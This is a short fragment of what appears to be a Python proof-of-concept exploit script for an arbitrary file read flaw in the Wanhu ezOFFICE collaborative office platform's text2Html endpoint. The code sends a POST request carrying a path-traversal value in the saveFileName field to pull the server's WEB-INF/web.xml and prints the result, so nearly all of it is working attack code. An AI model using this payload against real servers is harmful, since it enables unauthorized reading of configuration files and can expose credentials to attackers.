...
# 漏洞payload
payload=r"/defaultroot/convertFile/text2Html.controller"
# 漏洞名称
vul_name="万户协同办公平台ezoffice text2Html接口任意文件读取漏洞"
...
def send_request(url):
    try:   
        response=requests.post(f"{url}{payload}",data="saveFileName=123456/../../../../WEB-INF/web.xml&moduleName=html",timeout=10,verify=False)
        print(response.text)
